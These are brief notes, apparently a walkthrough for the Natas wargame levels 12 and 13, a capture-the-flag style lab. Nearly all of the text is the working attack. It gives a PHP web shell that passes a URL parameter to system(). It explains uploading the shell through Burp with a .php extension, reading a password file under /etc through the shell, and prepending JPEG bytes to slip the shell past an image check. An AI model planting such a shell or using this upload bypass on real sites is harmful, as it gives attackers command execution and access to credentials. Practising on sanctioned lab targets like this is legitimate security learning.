submit a file containing: 
<?
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?> 
in burp, change the filename so the extention is .php
then submit a GET request for the file
/uploads/file.php?cmd=cat+../../../../../etc/natas_webpas/natas13

same as natas12, but you must start w a .jpg file and keep some of the jpeg file before putting in the php code
